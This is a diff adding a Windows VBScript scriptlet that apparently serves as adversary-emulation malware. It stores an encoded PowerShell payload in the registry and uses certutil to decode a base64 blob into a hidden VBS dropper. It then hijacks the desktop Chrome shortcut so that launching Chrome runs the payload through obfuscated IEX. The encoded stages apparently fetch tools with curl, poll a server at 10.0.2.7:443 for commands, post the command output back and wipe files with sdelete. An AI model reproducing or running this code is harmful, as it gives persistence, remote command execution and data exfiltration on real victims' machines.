@@ -1,0 +1,37 @@
+<?XML version="1.0"?>
+<scriptlet>
+<registration progid="m31uzT0U" classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
+	<script language="VbScript">
+		<![CDATA[
+			Set WshShell = CreateObject("WScript.Shell")
+			Set fso = CreateObject("Scripting.FileSystemObject")
+			
+			reg_key = "HKCU\Software\Microsoft\Windows\CurrentVersion\debug\Test"
+			reg_value = "aQBuAHYAbwBrAGUALQBpAHQAZQBtACAAJABlAG4AdgA6AHQAZQBtAHAAXABiAGEAdABzAGkAZwBuAGEAbAAuAHYAYgBzAAoA"
+			WshShell.RegWrite reg_key, reg_value, "REG_SZ"
+			
+			WshShell.Run "cmd /c echo U2V0IFdzaFNoZWxsID0gQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikKZjE9cm5kKCkKZjI9cm5kKCkKV3NoU2hlbGwuUnVuICJjbWQgL2MgZGVsICVURU1QJVwqLmJhdCIsIDAsIFRydWUKV3NoU2hlbGwuUnVuICJjbWQgL2MgZWNobyBRR1ZqYUc4Z2IyWm1DZ3BUUlZRZ0wwRWdTVTVFUlZnOU1RcFRSVlFnTDBFZ1EwOVZUbFE5TlFwVFJWUWdjSEpsY1QwaU1DSUtDa2xHSUU1UFZDQkZXRWxUVkNBbFZFVk5VQ1ZjY0hOd2FXNW5OalF1WlhobElDZ0tDV04xY213Z2FIUjBjSE02THk5c2FYWmxMbk41YzJsdWRHVnlibUZzY3k1amIyMHZjSE53YVc1bk5qUXVaWGhsSUMwdGIzVjBjSFYwSUNWVVJVMVFKVnh3YzNCcGJtYzJOQzVsZUdVS0tRb0tTVVlnVGs5VUlFVllTVk5VSUNWVVJVMVFKVnh6WkdWc1pYUmxOalF1WlhobElDZ0tDV04xY213Z2FIUjBjSE02THk5c2FYWmxMbk41YzJsdWRHVnlibUZzY3k1amIyMHZjMlJsYkdWMFpUWTBMbVY0WlNBdExXOTFkSEIxZENBbFZFVk5VQ1ZjYzJSbGJHVjBaVFkwTG1WNFpRb3BDZ3BwWmlCT1QxUWdSVmhKVTFRZ0pWUkZUVkFsWEdGalkyVnpjMk5vYXk1bGVHVWdLQW9KWTNWeWJDQm9kSFJ3Y3pvdkwyeHBkbVV1YzNsemFXNTBaWEp1WVd4ekxtTnZiUzloWTJObGMzTmphR3N1WlhobElDQXRMVzkxZEhCMWRDQWxWRVZOVUNWY1lXTmpaWE56WTJockxtVjRaUW9wQ2dvNlFrVkJRMDlPQ2tsR0lDVkpUa1JGV0NVZ1RFVlJJQ1ZEVDFWT1ZDVWdLQW9KSlZSRlRWQWxYSEJ6Y0dsdVp6WTBMbVY0WlNBdllXTmpaWEIwWlhWc1lTQXRiaUF4SUMxcElEQWdNVEF1TUM0eUxqYzZORFF6SUh3Z1ptbHVaSE4wY2lBdlF6b2lVbVZqWldsMlpXUWdQU0F4SWlBK0lFNVZUQ0FtSmlBb1IwOVVUenBYU0VsTVJTa0tDWFJwYldWdmRYUWdMM1FnTWlBdmJtOWljbVZoYXlBK0lFNVZUQW9KZEdsdFpXOTFkQ0F2ZENBeE1qQWdMMjV2WW5KbFlXc2dQaUJPVlV3S0NWTkZWQ0F2UVNBaVNVNUVSVmc5SlVsT1JFVllKU3N4SWdvSlIwOVVUenBDUlVGRFQwNGdDaWtnUlV4VFJTQW9DZ2wwWVhOcmEybHNiQ0F2UmlBdlNVMGdZMjFrTG1WNFpRb3BDZ29LQ2pwWFNFbE1SUXBHVDFJZ0wwWWdJbVJsYkdsdGN6MGlJQ1VsYVNCSlRpQW9KMk4xY213Z0xXc2dMVmdnUjBWVUlHaDBkSEJ6T2k4dk1UQXVNQzR5TGpjNk5EUXpJQzEwYkhOMk1TY3BJRVJQSUhObGRDQmpiMjF0WVc1a1BTVWxhUXBEUVV4TUlDVmpiMjF0WVc1a0pTQStJQ1ZVUlUxUUpWeHZkWFFLWTNWeWJDQXRXQ0JRVDFOVUlDMHRaR0YwWVMxaWFXNWhjbmtnUUNWVVJVMVFKVnh2ZFhRZ2FIUjBjSE02THk4eE1DNHdMakl1TnpvME5ETWdMV3NnTFhSc2MzWXhDbVZqYUc4Z1BpQWxWRVZOVUNWY2IzVjBDaVZVUlUxUUpWeHpaR1ZzWlhSbE5qUXVaWGhsSUMxd0lESWdMMkZqWTJWd2RHVjFiR0VnSlZSRlRWQWxYRzkxZEFwMGFXMWxiM1YwSUM5MElEVWdMMjV2WW5KbFlXc2dQazVWVEFwSFQxUlBPbGRJU1V4RkNnb2xWRVZOVUNWY2MyUmxiR1YwWlRZMExtVjRaU0F0Y0NBMUlDOWhZMk5sY0hSbGRXeGhJQ1ZVUlUxUUpWeHZkWFFLZEdGemEydHBiR3dnTDBZZ0wwbE5JR050WkM1bGVHVUtDZz09ID4gJVRFTVAlXCIgJiBmMSwgMCwgVHJ1ZQpXc2hTaGVsbC5SdW4gImNtZCAvYyBjZXJ0dXRpbCAtZGVjb2RlICVURU1QJVwiICYgZjEgJiAiICVURU1QJVwiICYgZjIgJiAiLmJhdCIsIDAsIFRydWUKV3NoU2hlbGwuUnVuICJjbWQgL2MgJVRFTVAlXHNkZWxldGU2NC5leGUgLXAgMiAlVEVNUCVcIiAmIGYxLCAwLCBUcnVlCldzaFNoZWxsLlJ1biAiY21kIC9jIHN0YXJ0IC9CICVURU1QJVwiICYgZjIgJiAiLmJhdCIsIDAsIFRydWUKU2V0IFdzaFNoZWxsID0gTm90aGluZwo= > %TEMP%\batsignal", 0, True
+			WshShell.Run  "cmd /c certutil -decode %TEMP%\batsignal %TEMP%\batsignal.vbs", 0, True
+			WshShell.Run "cmd /c attrib +h +s %TEMP%\batsignal.vbs", 0, True
+			
+			mtarget = ";$k=(gp HKCU:\Software\Microsoft\Windows\CurrentVersion\debug -Name Test).Test;$c=$(powershell -enc $k);I`E`X '$c'"
+			
+			lnkFilename = "C:\Users\IEUser\Desktop\Google Chrome.lnk"
+			targetFilepath = "C:\Program Files\Google\Chrome\Application\chrome.exe" 
+
+			if fso.FileExists(lnkFilename) Then
+			   WshShell.Run "cmd /c del " & lnkFilename, 0, True
+			End If
+			
+			Set lnk = WshShell.CreateShortcut(lnkFilename)
+			
+			lnk.TargetPath = "C:\Windows\System32\WindowsPowershell\v1.0\powershell.e"+"xe"
+			lnk.Arguments = " -nologo -c " & Chr(34) & "invoke-item "& Chr(92) & Chr(34) & targetFilepath & Chr(92) & Chr(34) & mtarget & Chr(34)
+         lnk.IconLocation = targetFilepath
+         lnk.WindowStyle = 7
+         lnk.Save
+         Set lnk = Nothing
+	
+		]]></script>
+</registration>
+</scriptlet>
